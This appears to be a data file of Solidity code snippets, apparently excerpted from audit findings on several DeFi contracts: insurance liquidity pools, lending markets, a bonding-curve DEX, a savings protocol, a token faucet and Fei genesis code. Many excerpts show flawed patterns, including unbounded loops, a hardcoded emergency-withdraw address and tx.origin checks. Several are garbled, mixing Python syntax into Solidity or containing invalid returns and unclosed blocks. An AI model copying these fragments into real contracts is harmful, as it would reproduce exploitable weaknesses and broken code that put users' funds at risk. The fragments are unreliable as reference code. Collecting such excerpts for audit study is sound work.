```\nfunction _updateEpochsInfo() internal {\n    uint256 _totalEpochTime = block.timestamp.sub(epochStartTime);\n    uint256 _countOfPassedEpoch = _totalEpochTime.div(epochDuration);\n\n    uint256 _lastEpochUpdate = currentEpochNumber;\n    currentEpochNumber = _countOfPassedEpoch.add(1);\n\n    for (uint256 i = _lastEpochUpdate; i < currentEpochNumber; i++) {\n        totalCoverTokens = totalCoverTokens.sub(epochAmounts[i]);\n        delete epochAmounts[i];\n    }\n}\n```
```\nfor (uint256 i = 0; i < _teamsNumber; i++) {\n```\n```\nfor (uint256 i = 0; i < _membersNumber; i++) {\n```\n```\nfor (uint256 i = 0; i < _usersNumber; i++) {\n```
```\nfunction _removeFromQueue(uint256 _countToRemove) internal {\n    for (uint256 i = 0; i < _countToRemove; i++) {\n        delete withdrawalsInfo[withdrawalQueue[i]];\n    }\n\n    if (_countToRemove == withdrawalQueue.length) {\n        delete withdrawalQueue;\n    } else {\n        uint256 _remainingArrLength = withdrawalQueue.length.sub(_countToRemove);\n        address[] memory _remainingArr = new address[](_remainingArrLength);\n\n        for (uint256 i = 0; i < _remainingArrLength; i++) {\n            _remainingArr[i] = withdrawalQueue[i + _countToRemove];\n        }\n\n        withdrawalQueue = _remainingArr;\n    }\n}\n```
```\nfunction requestWithdrawal(uint256 _tokensToWithdraw) external override {\n```
"```\nfunction _addLiquidityFor(address _liquidityHolderAddr, uint256 _liquidityAmount, bool _isLM) internal {\n    daiToken.transferFrom(_liquidityHolderAddr, address(this), _liquidityAmount);\n\n    uint256 _amountToMint = _liquidityAmount.mul(PERCENTAGE_100).div(getDAIToDAIxRatio());\n    totalLiquidity = totalLiquidity.add(_liquidityAmount);\n    _mintERC20(_liquidityHolderAddr, _amountToMint);\n\n    if (_isLM) {\n        liquidityFromLM[_liquidityHolderAddr] = liquidityFromLM[_liquidityHolderAddr].add(_liquidityAmount);\n    }\n\n    _updateWithdrawalQueue();\n\n    emit AddLiquidity(_liquidityHolderAddr, _liquidityAmount, totalLiquidity);\n}\n```"
```\nif (leaderboard.length == MAX_LEADERBOARD_SIZE + 1) {\n    leaderboard.pop();\n}\n```\n```\nif (topUsers.length == MAX_TOP_USERS_SIZE.add(1)) {\n    topUsers.pop();\n}\n```\n```\nif (_addresses.length == MAX_GROUP_LEADERS_SIZE.add(1)) {\n    groupsLeaders[_referralLink].pop();\n}\n```\n```\nif (limitedSizedArray.length > MAX_DEFINED_SIZE_FOR_ARRAY):\n    limitedSizedArray.pop()\n```
```\n_updateTopUsers()\n_updateLeaderboard(_userTeamInfo.teamAddr)\n_updateGroupLeaders(_userTeamInfo.teamAddr)
```\nfor (uint256 i = 0; i < leaderboard.length; i++) {\n```\n```\nfor (uint256 i = 0; i < topUsers.length; i++) {\n```\n```\nuint256 _usersNumber = allUsers.length;\n```\n```\nfor (uint256 i = 0; i < _usersNumber; i++) {\n```
```\nstartLiquidityMiningTime = block.timestamp;\n```\n```\nfunction getEndLMTime() public view override returns (uint256) {\n    return startLiquidityMiningTime.add(2 weeks);\n}\n```\n```\ncontract A {\n    uint public immutable start;\n    uint public immutable end;\n\n    constructor() {\n        start = block.timestamp;\n        end = block.timestamp + 2 weeks;\n    }\n}
"```\nfunction _buyPolicyFor(\n    address _policyHolderAddr,\n    uint256 _epochsNumber,\n    uint256 _coverTokens\n) internal {\n```\n```\nuint256 _totalPrice = policyQuote.getQuote(_totalSeconds, _coverTokens, address(this));\n```\n```\nfunction getQuote(\n    uint256 _durationSeconds,\n    uint256 _tokens,\n    address _policyBookAddr\n) \nexternal \nview \noverride \nreturns (uint256 _daiTokens) {\n    _daiTokens = _getQuote(_durationSeconds, _tokens, _policyBookAddr);\n}\n```\n```\nfunction _getQuote(uint256 _durationSeconds, uint256 _tokens, address _policyBookAddr)\n  internal\n  view\n  returns (uint256)\n{\n```\n```\nrequire(_totalCoverTokens.add(_tokens) <= _totalLiquidity, ""PolicyBook: Requiring more than there exists"");\nrequire(_totalLiquidity > 0, ""PolicyBook: The pool is empty"");\n```"
"```\nfunction investDAI(uint256 _tokensAmount, address _policyBookAddr) external override {\n    //... rest of the code\n}\n```\nIPolicyBook(_policyBookAddr).addLiquidityFromLM(\n    msg.sender,\n    _tokensAmount\n)"
"```\naddress _currentAddr = withdrawalQueue.head();\nuint256 _tokensToWithdraw = withdrawalsInfo[_currentAddr].withdrawalAmount;\n\nuint256 _amountInDAI = convertDAIXtoDAI(_tokensToWithdraw);\n\nif (_availableLiquidity < _amountInDAI) {\n    break;\n}\n```\n```\n} else if (_availableLiquidity < convertDAIXtoDAI(_tokensToWithdraw)) {\n    uint256 _availableDAIxTokens = convertDAIToDAIx(_availableLiquidity);\n    uint256 _currentWithdrawalAmount = _tokensToWithdraw.sub(_availableDAIxTokens);\n    withdrawalsInfo[_msgSender()].withdrawalAmount = _currentWithdrawalAmount;\n\n    aggregatedQueueAmount = aggregatedQueueAmount.add(_currentWithdrawalAmount);\n    withdrawalQueue.push(_msgSender());\n\n    _withdrawLiquidity(_msgSender(), _availableDAIxTokens);\n} else {\n```"
"```\npolicyHolders[_msgSender()] = PolicyHolder(\n    _coverTokens,\n    currentEpochNumber,\n    _endEpochNumber,\n    _totalPrice,\n    _reinsurancePrice\n)\n\nepochAmounts[_endEpochNumber] = epochAmounts[_endEpochNumber].add(_coverTokens)\n```\n```\nuint256 _countOfPassedEpoch = block.timestamp.sub(epochStartTime).div(EPOCH_DURATION);\n\nnewTotalCoverTokens = totalCoverTokens;\nlastEpochUpdate = currentEpochNumber;\nnewEpochNumber = _countOfPassedEpoch.add(1);\n\nfor (uint256 i = lastEpochUpdate; i < newEpochNumber; i++) {\n    newTotalCoverTokens = newTotalCoverTokens.sub(epochAmounts[i]);\n}\n```\n```\nfunction isPolicyActive(address _userAddr, address _policyBookAddr) public override view returns (bool) {\n    PolicyInfo storage _currentInfo = policyInfos[_userAddr][_policyBookAddr];\n\n    if (_currentInfo.endTime == 0) {\n        return false;\n    }\n\n    return _currentInfo.endTime.add(STILL_CLAIMABLE_FOR) > block.timestamp;\n}\n```"
"```\nPolicyHolder storage holder = policyHolders[claimer];\n\nepochAmounts[holder.endEpochNumber] = \n    epochAmounts[holder.endEpochNumber].sub(holder.coverTokens);\n\ntotalLiquidity = totalLiquidity.sub(claimAmount);\n\ndaiToken.transfer(claimer, claimAmount);\n\ndelete policyHolders[claimer];\npolicyRegistry.removePolicy(claimer);\n```"
"```\nfunction remove(UniqueAddressQueue storage baseQueue, address addrToRemove) internal returns (bool) {\n    if (!contains(baseQueue, addrToRemove)) {\n        return false;\n    }\n\n    if (baseQueue.HEAD == addrToRemove) {\n        return removeFirst(baseQueue);\n    }\n\n    if (baseQueue.TAIL == addrToRemove) {\n        return removeLast(baseQueue);\n    }\n\n    address prevAddr = baseQueue.queue[addrToRemove].prev;\n    address nextAddr = baseQueue.queue[addrToRemove].next;\n    baseQueue.queue[prevAddr].next = nextAddr;\n    baseQueue.queue[nextAddr].prev = prevAddr;\n    baseQueue.queueLength--;\n    return true;\n}\n```"
```\nuint256 _tmpIndex = _currentIndex - 1;\nuint256 _currentUserAmount = usersTeamInfo[msg.sender].stakedAmount;\n\nwhile (_currentUserAmount > usersTeamInfo[topUsers[_tmpIndex]].stakedAmount) {\n    address _tmpAddr = topUsers[_tmpIndex];\n    topUsers[_tmpIndex] = msg.sender;\n    topUsers[_tmpIndex + 1] = _tmpAddr;\n\n    if (_tmpIndex == 0) {\n        break;\n    }\n\n    _tmpIndex--;\n}\n```\n```\nfunction _getAvailableMonthForReward(address _userAddr) internal view returns (uint256) {\n    uint256 _oneMonth = 30 days;\n    uint256 _startRewardTime = getEndLMTime();\n\n    uint256 _countOfRewardedMonth = countsOfRewardedMonth[usersTeamInfo[_userAddr].teamAddr][_userAddr];\n    uint256 _numberOfMonthForReward;\n\n    for (uint256 i = _countOfRewardedMonth; i < MAX_MONTH_TO_GET_REWARD; i++) {\n        if (block.timestamp > _startRewardTime.add(_oneMonth.mul(i))) {\n            _numberOfMonthForReward++;\n        } else {\n            break;\n        }\n    }\n\n    return _numberOfMonthForReward;\n}\n```\n```\nmapping (address => mapping (address => uint256)) public countsOfRewardedMonth;\n```\n```\nstruct UserTeamInfo {\n    string teamName;\n    address teamAddr;\n\n    uint256 stakedAmount;\n    bool isNFTDistributed;\n}\n```
"```\nrequire(\n  totalLiquidity >= \n  totalCoverTokens.add(aggregatedQueueAmount).add(_daiTokensToWithdraw),\n  ""PB: Not enough available liquidity""\n);"
"```\nfunction commitClaim(address claimer, uint256 claimAmount)\n    external\n    override\n    onlyClaimVoting\n    updateBMIDAIXStakingReward\n{\n    PolicyHolder storage holder = policyHolders[claimer];\n\n    epochAmounts[holder.endEpochNumber] = epochAmounts[holder.endEpochNumber].sub(holder.coverTokens);\n    totalLiquidity = totalLiquidity.sub(claimAmount);\n\n    daiToken.transfer(claimer, claimAmount);\n\n    delete policyHolders[claimer];\n    policyRegistry.removePolicy(claimer);\n}\n```"
"```\nfunction _getCurrentCash() internal view override returns (uint256) {\n    return address(this).balance.sub(msg.value);\n}\n```\n```\nuint256 _totalSupplyUnderlying = \n    IERC20Upgradeable(_iToken).totalSupply().mul(\n        IiToken(_iToken).exchangeRateStored()\n    );\n\nrequire(\n    _totalSupplyUnderlying.add(_mintAmount) <= _market.supplyCapacity,\n    ""Token supply capacity reached""\n);\n```\n(, uint256 _shortfall,, ) = calcAccountEquity(_borrower);\n\nrequire(_shortfall > 0, ""Account does not have shortfall"");\n```"
```\nuint256 _len = _accountData.collaterals.length();\nfor (uint256 i = 0; i < _len; i++) {\n    IiToken _token = IiToken(_accountData.collaterals.at(i));\n```\n```\nlen = accountData.borrowed.length();\nfor (uint256 i = 0; i < len; i++) {\n    IiToken token = IiToken(accountData.borrowed.at(i));\n```
"```\n/**\n * @notice Calculate the utilization rate: `_borrows / (_cash + _borrows - _reserves)`\n * @param _cash Asset balance\n * @param _borrows Asset borrows\n * @param _reserves Asset reserves\n * @return Asset utilization [0, 1e18]\n */\nfunction utilizationRate(\n    uint256 _cash,\n    uint256 _borrows,\n    uint256 _reserves\n) internal pure returns (uint256) {\n    if (_borrows == 0) return 0;\n\n    return _borrows.mul(BASE).div(_cash.add(_borrows).sub(_reserves));\n}\n```"
"```\nfunction _updateInterest() internal virtual override {\n    InterestLocalVars memory _vars;\n    _vars.currentCash = _getCurrentCash();\n    _vars.totalBorrows = totalBorrows;\n    _vars.totalReserves = totalReserves;\n\n    _vars.borrowRate = interestRateModel.getBorrowRate(\n        _vars.currentCash,\n        _vars.totalBorrows,\n        _vars.totalReserves\n    );\n    require(\n        _vars.borrowRate <= maxBorrowRate,\n        ""_updateInterest: Borrow rate is too high!""\n    );\n}\n```\n```\n/**\n * @dev Sets a new interest rate model.\n * @param _newInterestRateModel The new interest rate model.\n */\nfunction _setInterestRateModel(\n    IInterestRateModelInterface _newInterestRateModel\n) external virtual onlyOwner {\n    // Gets current interest rate model.\n    IInterestRateModelInterface _oldInterestRateModel = interestRateModel;\n\n    // Ensures the input address is the interest model contract.\n    require(\n        _newInterestRateModel.isInterestRateModel(),\n        ""_setInterestRateModel: This is not the rate model contract!""\n    );\n\n    // Set to the new interest rate model.\n    interestRateModel = _newInterestRateModel;\n```\n```\nbase_interest_per_block = 0\ninterest_per_block = 5.074e10\nhigh_interest_per_block = 4.756e11\nhigh = 0.75e18\n```"
"```\n/**\n * @notice Update each iToken's distribution speed according to current global speed\n * @dev Only EOA can call this function\n */\nfunction updateDistributionSpeed() public override {\n    require(msg.sender == tx.origin, ""only EOA can update speeds"");\n    require(!paused, ""Can not update speeds when paused"");\n\n    _updateDistributionSpeed();\n}\n```"
"```\nfunction _withdrawReserves(address _token, uint256 _amount)\n    external\n    onlyOwner\n    onlyMSD(_token) {\n    (uint256 _equity,) = calcEquity(_token);\n\n    require(_equity >= _amount, ""Token do not have enough reserve"");\n\n    // Increase the token debt\n    msdTokenData[_token].debt = msdTokenData[_token].debt.add(_amount);\n\n    // Directly mint the token to owner\n    MSD(_token).mint(owner, _amount)\n```"
"```\nfunction _initialize(\n    string memory _name,\n    string memory _symbol,\n    uint8 _decimals,\n    IControllerInterface _controller,\n    IInterestRateModelInterface _interestRateModel\n) internal virtual {\n    controller = _controller;\n    interestRateModel = _interestRateModel;\n    accrualBlockNumber = block.number;\n    borrowIndex = BASE;\n    flashloanFeeRatio = 0.0008e18;\n    protocolFeeRatio = 0.25e18;\n    _Ownable_init();\n    _ERC20_init(_name, _symbol, _decimals);\n    _ReentrancyGuard_init();\n\n    uint256 chainId;\n\n    assembly {\n        chainId := chainid()\n    }\n    DOMAIN_SEPARATOR = keccak256(\n        abi.encode(\n            keccak256(\n                ""EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)""\n            ),\n            keccak256(bytes(_name)),\n            keccak256(bytes(""1"")),\n            chainId,\n            address(this)\n        )\n    );\n}\n```\n```\nbytes32 _digest = \n    keccak256(\n        abi.encodePacked(\n            ""\x19\x01"",\n            DOMAIN_SEPARATOR,\n            keccak256(\n                abi.encode(\n                    PERMIT_TYPEHASH,\n                    _owner,\n                    _spender,\n                    _value,\n                    _currentNonce,\n                    _deadline\n                )\n            )\n        )\n    );\n\naddress _recoveredAddress = ecrecover(_digest, _v, _r, _s);\nrequire(\n    _recoveredAddress!= address(0) && _recoveredAddress == _owner,\n    ""permit: INVALID_SIGNATURE!""\n);\n```"
"```\n/**\n * @notice receive ETH, used for flashloan repay.\n */\nreceive() external payable {\n    require(\n        msg.sender.isContract(),\n        ""receive: Only can call from a contract!""\n    );\n}\n```"
"```\nfunction addLiquidity(\n    LiquidityParams calldata lp,\n    uint deadline\n) external override ensure(deadline) returns (uint256 amountBase) {\n    if (IDAOfiV1Factory(factory).getPair(\n        lp.tokenBase,\n        lp.tokenQuote,\n        lp.slopeNumerator,\n        lp.n,\n        lp.fee\n    ) == address(0)) {\n        IDAOfiV1Factory(factory).createPair(\n            address(this),\n            lp.tokenBase,\n            lp.tokenQuote,\n            msg.sender,\n            lp.slopeNumerator,\n            lp.n,\n            lp.fee\n        );\n    }\n\n    address pair = DAOfiV1Library.pairFor(\n        factory,\n        lp.tokenBase,\n        lp.tokenQuote,\n        lp.slopeNumerator,\n        lp.n,\n        lp.fee\n    );\n\n    TransferHelper.safeTransferFrom(lp.tokenBase, lp.sender, pair, lp.amountBase);\n    TransferHelper.safeTransferFrom(lp.tokenQuote, lp.sender, pair, lp.amountQuote);\n    amountBase = IDAOfiV1Pair(pair).deposit(lp.to);\n}\n```"
"```\nfunction addLiquidity(\n    LiquidityParams calldata lp,\n    uint deadline\n) external override ensure(deadline) returns (uint256 amountBase) {\n    if (IDAOfiV1Factory(factory).getPair(\n        lp.tokenBase,\n        lp.tokenQuote,\n        lp.slopeNumerator,\n        lp.n,\n        lp.fee\n    ) == address(0)) {\n        IDAOfiV1Factory(factory).createPair(\n            address(this),\n            lp.tokenBase,\n            lp.tokenQuote,\n            msg.sender,\n            lp.slopeNumerator,\n            lp.n,\n            lp.fee\n        );\n    }\n\n    address pair = DAOfiV1Library.pairFor(\n        factory,\n        lp.tokenBase,\n        lp.tokenQuote,\n        lp.slopeNumerator,\n        lp.n,\n        lp.fee\n    );\n\n    TransferHelper.safeTransferFrom(lp.tokenBase, lp.sender, pair, lp.amountBase);\n    TransferHelper.safeTransferFrom(lp.tokenQuote, lp.sender, pair, lp.amountQuote);\n    amountBase = IDAOfiV1Pair(pair).deposit(lp.to);\n}\n```"
"```\nfunction _convert(address token, uint256 amount, uint8 resolution, bool to) private view returns (uint256 converted) {\n    uint8 decimals = IERC20(token).decimals();\n    uint256 diff = 0;\n    uint256 factor = 0;\n    converted = 0;\n\n    if (decimals > resolution) {\n        diff = uint256(decimals.sub(resolution));\n        factor = 10 ** diff;\n        if (to && amount >= factor) {\n            converted = amount / factor;\n        } else if (!to) {\n            converted = amount * factor;\n        }\n    } else if (decimals < resolution) {\n        diff = uint256(resolution.sub(decimals));\n        factor = 10 ** diff;\n        if (to) {\n            converted = amount * factor;\n        } else if (!to && amount >= factor) {\n            converted = amount / factor;\n        }\n    }\n}"
"```\nuint amountOut = IWETH10(WETH).balanceOf(address(this));\n\nrequire(\n    IWETH10(sp.tokenOut).balanceOf(address(this)).sub(balanceBefore) >= sp.amountOut,\n    'DAOfiV1Router: INSUFFICIENT_OUTPUT_AMOUNT'\n);\n```"
"```\nfunction deposit(address to) external override {\n    require(msg.sender == router, 'DAOfiV1: FORBIDDEN_DEPOSIT');\n    require(deposited == false, 'DAOfiV1: DOUBLE_DEPOSIT');\n\n    reserveBase = IERC20(baseToken).balanceOf(address(this));\n    reserveQuote = IERC20(quoteToken).balanceOf(address(this));\n\n    deposited = true;\n\n    if (reserveQuote > 0) {\n        supply = amountBaseOut = getBaseOut(reserveQuote);\n        if (amountBaseOut > 0) {\n            _safeTransfer(baseToken, to, amountBaseOut);\n            reserveBase = reserveBase.sub(amountBaseOut);\n        }\n    }\n\n    emit Deposit(msg.sender, reserveBase, reserveQuote, amountBaseOut, to);\n}\n```"
"```\nfunction deposit(address to) external override lock returns (uint256 amountBaseOut) {\n    require(msg.sender == router, 'DAOfiV1: FORBIDDEN_DEPOSIT');\n}\n```\n```\nfunction withdraw(address to) external override {\n    require(msg.sender == router, 'DAOfiV1: FORBIDDEN_WITHDRAW');\n    return (uint256 amountBase, uint256 amountQuote);\n}\n```\n```\nfunction swap(\n    address tokenIn,\n    address tokenOut,\n    uint256 amountIn,\n    uint256 amountOut,\n    address to\n) external override {\n    require(msg.sender == router, 'DAOfiV1: FORBIDDEN_SWAP');\n}\n```"
"```\nrequire(getPair(baseToken, quoteToken, slopeNumerator, n, fee) == address(0), 'DAOfiV1: PAIR_EXISTS');\n\nbytes memory bytecode = type(DAOfiV1Pair).creationCode;\nbytes32 salt = keccak256(abi.encodePacked(baseToken, quoteToken, slopeNumerator, n, fee));\n\nassembly {\n    pair := create2(0, add(bytecode, 32), mload(bytecode), salt)\n}\n\nIDAOfiV1Pair(pair).initialize(router, baseToken, quoteToken, pairOwner, slopeNumerator, n, fee);\npairs[salt] = pair;\n```"
"```\nfunction removeLiquidityETH(\n    LiquidityParams calldata lp,\n    uint deadline\n) external override ensure(deadline) returns (uint amountToken, uint amountETH) {\n    IDAOfiV1Pair pair = IDAOfiV1Pair(\n        DAOfiV1Library.pairFor(factory, lp.tokenBase, WETH, lp.slopeNumerator, lp.n, lp.fee)\n    );\n    require(msg.sender == pair.pairOwner(), 'DAOfiV1Router: FORBIDDEN');\n    (amountToken, amountETH) = pair.withdraw(address(this));\n    assert(IERC20(lp.tokenBase).transfer(lp.to, amountToken));\n    IWETH10(WETH).withdraw(amountETH);\n    TransferHelper.safeTransferETH(lp.to, amountETH);\n}\n```"
"```\nfunction withdraw(address _accountAddr, address _token, uint256 _amount) external onlyAuthorized returns(uint256) {\n    // Check if withdraw amount is less than user's balance\n    require(_amount <= getDepositBalanceCurrent(_token, _accountAddr), ""Insufficient balance."");\n    uint256 borrowLTV = globalConfig.tokenInfoRegistry().getBorrowLTV(_token);\n```\n```\nif (getBorrowETH(_accountAddr) <= getBorrowPower(_accountAddr)):\n    require(\n        getBorrowETH(_accountAddr) <= getBorrowPower(_accountAddr).sub(\n            _amount.mul(globalConfig.tokenInfoRegistry().priceFromAddress(_token))\n           .mul(borrowLTV).div(Utils.getDivisor(address(globalConfig), _token)).div(100)\n        ), ""Insufficient collateral when withdraw.""\n    )\n```"
"```\nfunction getBorrowPower(address _borrower) public view returns (uint256 power) {\n    for (uint8 i = 0; i < globalConfig.tokenInfoRegistry().getCoinLength(); i++) {\n        if (isUserHasDeposits(_borrower, i)) {\n            address token = globalConfig.tokenInfoRegistry().addressFromIndex(i);\n            uint divisor = INT_UNIT;\n            if (token!= ETH_ADDR) {\n                divisor = 10 ** uint256(globalConfig.tokenInfoRegistry().getTokenDecimals(token));\n            }\n            power = power.add(getDepositBalanceCurrent(token, _borrower)\n               .mul(globalConfig.tokenInfoRegistry().priceFromIndex(i))\n               .mul(globalConfig.tokenInfoRegistry().getBorrowLTV(token)).div(100)\n               .div(divisor)\n            );\n        }\n    }\n    return power;\n}\n```"
"```\nfunction priceFromAddress(address tokenAddress) public view returns(uint256) {\n    if (Utils._isETH(address(globalConfig), tokenAddress)) {\n        return 1e18;\n    }\n    return uint256(globalConfig.chainLink().getLatestAnswer(tokenAddress));\n}\n```"
```\nfunction getBorrowRatePerBlock(address _token) public view returns(uint) {\n    if (!globalConfig.tokenInfoRegistry().isSupportedOnCompound(_token)) {\n        return getCapitalUtilizationRatio(_token).mul(globalConfig.rateCurveSlope()).div(INT_UNIT).add(globalConfig.rateCurveConstant()).div(BLOCKS_PER_YEAR);\n    }\n    return (compoundPool[_token].depositRatePerBlock).mul(globalConfig.compoundSupplyRateWeights())\n       .add((compoundPool[_token].borrowRatePerBlock).mul(globalConfig.compoundBorrowRateWeights())).div(10);\n}\n```\n```\ncompoundPool[_token].depositRatePerBlock = \n    cTokenExchangeRate.mul(UNIT).div(lastCTokenExchangeRate[_token])\n   .sub(UNIT).div(blockNumber.sub(lastCheckpoint[_token]));\n```\n```\nreturn lastDepositeRateIndex.mul(\n    getBlockNumber().sub(lcp).mul(depositRatePerBlock).add(INT_UNIT)\n).div(INT_UNIT)\n```
"```\nstruct LiquidationVars {\n    uint256 borrowerCollateralValue;\n}\n```\n```\nif (token!= ETH_ADDR) {\n    divisor = 10 ** uint256(globalConfig.tokenInfoRegistry().getTokenDecimals(token));\n}\npower = power.add(getDepositBalanceCurrent(token, _borrower))\n```\nrequire(\n    totalBorrow.mul(100) <= totalCollateral.mul(liquidationDiscountRatio),\n    ""Collateral is not sufficient to be liquidated.""\n);\n```\nfunction _isETH(address _token) public view returns (bool) {\n    return globalConfig.constants().ETH_ADDR() == _token;\n}\n\nfunction getDivisor(address _token) public view returns (uint256) {\n    if (_isETH(_token)) {\n        return INT_UNIT;\n    }\n    return 10 ** uint256(getTokenDecimals(_token));\n}\n```\n```\nrequire(_borrowLTV!= 0, ""Borrow LTV is zero"");\nrequire(_borrowLTV < SCALE, ""Borrow LTV must be less than Scale"");\n```"
"```\n// EMERGENCY WITHDRAWAL FUNCTIONS\n// Needs to be removed when final version deployed\n\nfunction emergencyWithdraw(GlobalConfig globalConfig, address _token) public {\n    address cToken = globalConfig.tokenInfoRegistry().getCToken(_token);\n    // rest of code\n```\n```\nfunction emergencyWithdraw(address _token) external onlyEmergencyAddress {\n    SavingLib.emergencyWithdraw(globalConfig, _token);\n}\n```\n```\naddress payable public constant EMERGENCY_ADDR = 0xc04158f7dB6F9c9fFbD5593236a1a3D69F92167c;\n```"
"```\nfunction getBorrowETH(\n    address _accountAddr\n) public view returns (uint256 borrowETH) {\n    uint tokenNum = globalConfig.tokenInfoRegistry().getCoinLength();\n    for (uint i = 0; i < tokenNum; i++) {\n        if (isUserHasBorrows(_accountAddr, uint8(i))) {\n            address tokenAddress = globalConfig.tokenInfoRegistry().addressFromIndex(i);\n            uint divisor = INT_UNIT;\n            if (tokenAddress!= ETH_ADDR) {\n                divisor = 10 ** uint256(globalConfig.tokenInfoRegistry().getTokenDecimals(tokenAddress));\n            }\n            borrowETH = borrowETH.add(getBorrowBalanceCurrent(tokenAddress, _accountAddr).mul(globalConfig.tokenInfoRegistry().priceFromIndex(i)).div(divisor));\n        }\n    }\n    return borrowETH;\n}\n```\n```\nfunction priceFromIndex(uint index) public view returns(uint256) {\n    require(index < tokens.length, ""coinIndex must be smaller than the coins length."");\n    address tokenAddress = tokens[index];\n\n    if (Utils._isETH(address(globalConfig), tokenAddress)) {\n        return 1e18;\n    }\n    return uint256(globalConfig.chainLink().getLatestAnswer(tokenAddress));\n}\n```\n```\nfunction getBorrowBalanceCurrent(\n    address _token,\n    address _accountAddr\n) public view returns (uint256 borrowBalance) {\n    AccountTokenLib.TokenInfo storage tokenInfo = accounts[_accountAddr].tokenInfos[_token];\n    uint accruedRate;\n\n    if (tokenInfo.getBorrowPrincipal() == 0) {\n        return 0;\n    } else {\n        if (globalConfig.bank().borrowRateIndex(_token, tokenInfo.getLastBorrowBlock()) == 0) {\n            accruedRate = INT_UNIT;\n        } else {\n            accruedRate = globalConfig.bank().borrowRateIndexNow(_token)\n               .mul(INT_UNIT)\n               .div(globalConfig.bank().borrowRateIndex(_token, tokenInfo.getLastBorrowBlock()));\n        }\n        return tokenInfo.getBorrowBalance(accruedRate);\n    }\n}"
```\nfunction getCoinLength() public view returns (uint256 length) {\n    return tokens.length;\n}\n```
"```\nuint256 assetTotalSupply = asset.balanceOf(address(this));\nuint256 availableTotalSupply = assetTotalSupply.sub(totalUnclaimed);\nuint256 newSeconds = currentTimestamp.sub(lastDripTimestamp);\nuint256 nextExchangeRateMantissa = exchangeRateMantissa;\nuint256 newTokens;\nuint256 measureTotalSupply = measure.totalSupply();\n\nif (measureTotalSupply > 0 && availableTotalSupply > 0 && newSeconds > 0) {\n    newTokens = newSeconds.mul(dripRatePerSecond);\n    if (newTokens > availableTotalSupply) {\n        newTokens = availableTotalSupply;\n    }\n    uint256 indexDeltaMantissa = measureTotalSupply > 0\n       ? FixedPoint.calculateMantissa(newTokens, measureTotalSupply)\n        : 0;\n    nextExchangeRateMantissa = nextExchangeRateMantissa.add(indexDeltaMantissa);\n\n    emit Dripped(newTokens);\n}\n```"
"```\nuint256 deltaExchangeRateMantissa = uint256(exchangeRateMantissa).sub(userState.lastExchangeRateMantissa);\n\nuint128 newTokens = FixedPoint.multiplyUintByMantissa(userMeasureBalance, deltaExchangeRateMantissa).toUint128();\n\nuserStates[user] = UserState({\n    lastExchangeRateMantissa: exchangeRateMantissa,\n    balance: uint256(userState.balance).add(newTokens).toUint128()\n});\n```"
```\nif (token == address(measure) && from!= address(0)) {\n    drip();\n}\n```
"```\nrequire(_dripRatePerSecond > 0, ""TokenFaucet/dripRate-gt-zero"");\n\nasset = _asset;\nmeasure = _measure;\nsetDripRatePerSecond(_dripRatePerSecond);\n```\n```\nfunction setDripRatePerSecond(uint256 _dripRatePerSecond) public onlyOwner {\n    require(_dripRatePerSecond > 0, ""TokenFaucet/dripRate-gt-zero"");\n```\n```\nfunction drip() public returns (uint256) {\n    uint256 currentTimestamp = _currentTime();\n\n    if (lastDripTimestamp == uint32(currentTimestamp)) {\n        return 0;\n    }\n\n    uint256 newSeconds = currentTimestamp.sub(lastDripTimestamp);\n\n    if (measureTotalSupply > 0 && availableTotalSupply > 0 && newSeconds > 0) {\n        uint256 indexDeltaMantissa = measureTotalSupply > 0? FixedPoint.calculateMantissa(newTokens, measureTotalSupply) : 0;\n    }\n```"
"```\nfunction commit(address from, address to, uint amount) external override onlyGenesisPeriod {\n    burnFrom(from, amount);\n\n    committedFGEN[to] = amount;\n    totalCommittedFGEN += amount;\n\n    emit Commit(from, to, amount);\n}\n```"
"```\nfunction incentivize(\n    address sender,\n    address receiver,\n    address operator,\n    uint amountIn\n) external override onlyFei {\n    updateOracle();\n\n    if (isPair(sender)) {\n        incentivizeBuy(receiver, amountIn);\n    }\n\n    if (isPair(receiver)) {\n        require(isSellAllowlisted(sender) || isSellAllowlisted(operator), ""UniswapIncentive: Blocked Fei sender or operator"");\n        incentivizeSell(sender, amountIn);\n    }\n}\n```\n```\nfunction incentivizeBuy(address target, uint amountIn) internal {\n    if (isExemptAddress(target)) {\n        return;\n    }\n\n    (uint incentive, uint32 weight,\n    Decimal.D256 memory initialDeviation,\n    Decimal.D256 memory finalDeviation) = getBuyIncentive(amountIn);\n\n    updateTimeWeight(initialDeviation, finalDeviation, weight);\n    if (incentive!= 0) {\n        fei().mint(target, incentive);\n    }\n}\n```\n```\nfunction getBuyIncentive(uint amount) public view override returns (\n    uint incentive,\n    uint32 weight,\n    Decimal.D256 memory initialDeviation,\n    Decimal.D256 memory finalDeviation\n) {\n    (initialDeviation, finalDeviation) = getPriceDeviations(-1 * int256(amount));\n}"
"```\nfunction _incentivize() internal virtual {\n    if (isTimeEnded()) {\n        _initTimed(); // reset window\n        fei().mint(msg.sender, incentiveAmount);\n    }\n}\n```"
```\nuint totalGenesisTribe = tribeBalance() - totalCommittedTribe;\n```
"```\nweth.transfer(address(pair), amount)\n```"
"```\nburnFrom(from, amountFGEN)\ncommittedFGEN[from] = 0\n\npayable(to).transfer(total)\n```\n```\nuint amountFei = feiBalance() * totalCommittedFGEN / (totalSupply() + totalCommittedFGEN);\n\nif (amountFei!= 0) {\n    totalCommittedTribe = ido.swapFei(amountFei);\n}\n```"
"```\nstakedToken.transferFrom(\n    from,\n    address(this),\n    amount\n);\n```\nfei().transferFrom(\n    msg.sender,\n    address(pair),\n    amountFei\n)"
"```\nfunction _claim(address from, address to) internal returns (uint256) {\n    (uint256 amountReward, uint256 amountPool) = redeemableReward(from);\n    require(amountPool!= 0, ""Pool: User has no redeemable pool tokens"");\n\n    _burnFrom(from, amountPool);\n    _incrementClaimed(amountReward);\n\n    rewardToken.transfer(to, amountReward);\n    return amountReward;\n}"
"```\nassert(msg.sender == address(WETH))  # only accept ETH via fallback from the WETH contract\n```\n```\nassert(IWETH(WETH).transfer(address(PAIR), amountIn))\n```"
"```\nrequire(msg.value == value, ""GenesisGroup: value mismatch"")\n```"
